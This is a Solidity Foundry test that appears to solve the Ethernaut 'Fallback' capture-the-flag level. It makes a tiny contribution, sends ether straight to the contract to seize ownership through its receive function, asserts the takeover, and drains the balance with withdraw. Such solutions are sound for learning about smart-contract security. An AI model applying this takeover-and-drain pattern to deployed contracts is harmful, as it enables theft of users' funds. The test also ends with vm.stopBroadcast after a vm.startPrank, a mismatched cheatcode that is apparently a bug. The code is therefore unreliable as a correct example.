pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackTest is Test {
    Fallback public fb;

    function setUp() public {
        fb = new Fallback();
    }

    function testFallback() public {
        address playerAddress = makeAddr("player");
        address fbAddress = address(fb);

        emit log_address(fb.owner());
        emit log_address(playerAddress);

        vm.deal(playerAddress, 1 ether);
        vm.startPrank(playerAddress);

        fb.contribute{value: 1 wei}();
        payable(fbAddress).call{value: 1 wei}("");
        emit log_address(fb.owner());
        assertEq(fb.owner(), playerAddress);
        fb.withdraw();

        vm.stopBroadcast();
    }

    receive() external payable {}
}